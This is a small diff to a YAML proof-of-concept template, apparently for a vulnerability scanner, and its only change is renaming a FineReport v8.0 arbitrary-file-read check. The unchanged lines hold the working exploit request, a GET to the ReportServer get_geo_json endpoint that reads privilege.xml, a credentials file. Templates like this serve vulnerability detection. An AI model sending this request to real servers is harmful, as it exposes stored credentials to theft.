@@ -1,4 +1,4 @@
-name: poc-yaml-FineReport-v8.0-Arbitrary-file-read
+name: poc-yaml-fineReport-v8.0-arbitrary-file-read
 rules:
   - method: GET
     path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
